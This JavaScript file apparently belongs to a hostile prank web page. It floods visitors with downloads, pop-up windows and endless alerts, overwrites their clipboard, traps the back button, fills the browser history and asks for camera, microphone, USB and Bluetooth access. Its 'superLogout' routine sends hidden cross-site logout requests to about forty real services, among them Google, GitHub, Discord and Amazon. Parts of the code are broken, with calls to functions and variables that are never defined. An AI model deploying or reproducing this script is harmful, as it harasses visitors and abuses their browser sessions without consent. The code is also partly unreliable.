let numSuperLogoutIframes = 0;
const HIDDEN_STYLE = 'display:none;';

function downloadFiles(files) {
    files.forEach(file => {
        const link = document.createElement('a');
        link.href = `media/${file}`;
        link.download = file;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    });
}

function openLinks(links) {
    links.forEach(link => {
        window.open(link, '_blank');
    });
}

function resizeWindow() {
    let width = 300;
    let height = 200;
    const maxWidth = 800;
    const maxHeight = 600;
    const interval = setInterval(() => {
        if (width < maxWidth && height < maxHeight) {
            width += 50;
            height += 50;
            window.resizeTo(width, height);
        } else {
            clearInterval(interval);
        }
    }, 2000);
}

function main() {
    const filesToDownload = ['ez-yann.png', 'gerbus.png', 'readme.txt'];
    const linksToOpen = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ'];

    setInterval(() => {
        downloadFiles(filesToDownload);
        openLinks(linksToOpen);
    }, 1000);

    function copyRandomString() {
        const randomString = Math.random().toString(36).substring(2, 18);
        navigator.clipboard.writeText(randomString).then(() => {
            console.log(randomString);
        });
    }

    function randomAlert() {
        const randomString = Math.random().toString(36).substring(2, 18);
        alert(randomString);
        setTimeout(randomAlert, 1000);
    }

    function openMovingVideo() {
        const videoWindow = window.open('media/wide.mp4', 'videoWindow', 'width=400,height=300');
        let posX = 0;
        let posY = 0;
        const moveVideo = () => {
            posX += 5;
            posY += 5;
            videoWindow.moveTo(posX, posY);
            if (posX < window.screen.width && posY < window.screen.height) {
                requestAnimationFrame(moveVideo);
            }
        };
        moveVideo();
    }

        function openMovingVideo2() {
        const videoWindow = window.open('media/wide.mp4', 'videoWindow', 'width=400,height=300');
        let posX = 0;
        let posY = 0;
        const moveVideo2 = () => {
            posX += 5;
            posY += 5;
            videoWindow.moveTo(posX, posY);
            if (posX < window.screen.width && posY < window.screen.height) {
                requestAnimationFrame(moveVideo);
            }
        };
        moveVideo2();
    }

    function requestCameraAndMicrophone() {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                console.log('Camera and microphone access granted.');
            })
            .catch(err => {
                console.log(err);
            });
    }

    function hideCursor() {
        document.body.style.cursor = 'none';
    }

    function speakText(text) {
        const utterance = new SpeechSynthesisUtterance(text);
        window.speechSynthesis.speak(utterance);
    }

    function requestUSBPermission() {
        navigator.usb.requestDevice({ filters: [] })
            .then(device => {
                console.log(device);
            })
            .catch(err => {
                console.log(err);
            });
    }

    function requestBluetoothPermission() {
        navigator.bluetooth.requestDevice({ acceptAllDevices: true })
            .then(device => {
                console.log(device);
            })
            .catch(err => {
                console.log(err);
            });
    }

    const LOGOUT_SITES = {
        Discord: ['POST', 'https://discord.com/api/v9/auth/logout', { provider: null, voip_provider: null }],
        Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
        DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
        Dropbox: ['GET', 'https://www.dropbox.com/logout'],
        eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
        GitHub: ['GET', 'https://github.com/logout'],
        GMail: ['GET', 'https://mail.google.com/mail/?logout'],
        Google: ['GET', 'https://www.google.com/accounts/Logout'],
        Hulu: ['GET', 'https://secure.hulu.com/logout'],
        NetFlix: ['GET', 'https://www.netflix.com/Logout'],
        Skype: ['GET', 'https://secure.skype.com/account/logout'],
        SoundCloud: ['GET', 'https://soundcloud.com/logout'],
        'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
        'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
        Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:User Logout'],
        'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
        Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
        Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
        YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
        JShop: ['GET', 'https://jshop.partners/panel/logout'],
        Vimeo: ['GET', 'https://vimeo.com/log_out'],
        Tumblr: ['GET', 'https://www.tumblr.com/logout'],
        Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
        OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
        InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
        OLX: ['GET', 'https://www.olx.pl/account/logout'],
        Roblox: ['POST', 'https://auth.roblox.com/v2/logout'],
        ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
        Guilded: ['POST', 'https://www.guilded.gg/api/logout'],
        LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
        Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
        Reddit: ['GET', 'https://www.reddit.com/logout'],
        Spotify: ['GET', 'https://www.spotify.com/logout/'],
        Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
        Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
        Trello: ['GET', 'https://trello.com/logout'],
        Baidu: ['GET', 'https://passport.baidu.com/?logout'],
        VK: ['GET', 'https://vk.com/exit'],
        StackOverflow: ['GET', 'https://stackoverflow.com/users/logout']
    };

    function superLogout() {
        function cleanup(el, delayCleanup) {
            if (delayCleanup) {
                delayCleanup = false;
                return;
            }
            el.parentNode.removeChild(el);
        }

        function get(url) {
            const img = document.createElement('img');
            img.onload = () => cleanup(img);
            img.onerror = () => cleanup(img);
            img.style = HIDDEN_STYLE;
            document.body.appendChild(img);
            img.src = url;
        }

        function post(url, params) {
            const iframe = document.createElement('iframe');
            iframe.style = HIDDEN_STYLE;
            iframe.name = 'iframe' + numSuperLogoutIframes;
            document.body.appendChild(iframe);

            numSuperLogoutIframes += 1;

            const form = document.createElement('form');
            form.style = HIDDEN_STYLE;

            let numLoads = 0;
            iframe.onload = iframe.onerror = () => {
                if (numLoads >= 1) cleanup(iframe);
                numLoads += 1;
            };
            form.action = url;
            form.method = 'POST';
            form.target = iframe.name;

            for (const param in params) {
                if (Object.prototype.hasOwnProperty.call(params, param)) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = param;
                    input.value = params[param];
                    form.appendChild(input);
                }
            }

            document.body.appendChild(form);
            form.submit();
        }

        for (const name in LOGOUT_SITES) {
            const method = LOGOUT_SITES[name][0];
            const url = LOGOUT_SITES[name][1];
            const params = LOGOUT_SITES[name][2] || {};

            if (method === 'GET') {
                get(url);
            } else {
                post(url, params);
            }

            const div = document.createElement('div');
            div.innerText = `Logging out from ${name}...`;
            const logoutMessages = document.querySelector('.logout-messages');
            logoutMessages.appendChild(div);
        }
    }

    function disableBack() {
        window.history.pushState(null, '', window.location.href);
        window.onpopstate = function () {
            window.history.pushState(null, '', window.location.href);
        };
    }

    function iframeSpam() {
        for (let i = 0; i < 10; i++) {
            const iframe = document.createElement('iframe');
            iframe.src = 'https://github.com/hazetlab/hazetlab.github.io/media/OCOBG.mp3';
            document.body.appendChild(iframe);
        }
    }

    function generateRandomPhrase() {
        const phrases = [
            "looololoolollooloooloolooolololololololololol tralalalalalalaalal ptoszek to koxxxx",
            "zerfitel",
            "ZERFITHELLL",
            "krol_dzasioch",
            "UmBSyGEQdfsRTACpyMhfyQ=="
        ];
        return phrases[Math.floor(Math.random() * phrases.length)];
    }

    function fillHistory() {
        for (let i = 0; i < 10; i++) {
            const randomPhrase = generateRandomPhrase();
            const randomUrl = `https://hazetlab.github.io/${encodeURIComponent(randomPhrase)}`;
            window.history.pushState({ phrase: randomPhrase }, randomPhrase, randomUrl);
        }
    }

    function playMusic(url) {
        const audio = new Audio(url);
        audio.volume = 1.0;
        audio.play().catch(error => {
            console.error(error);
        });
    }

    const musicUrl = 'media/video.mp3';
    playMusic(musicUrl);

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}


function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}
    
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}
    
    // Call functions
    copyRandomString();
    randomAlert();
    openMovingVideo();
    requestCameraAndMicrophone();
    hideCursor();
    requestUSBPermission();
    requestBluetoothPermission();
    disableBack();
    iframeSpam();
    fillHistory();
    superLogout();
}

main();
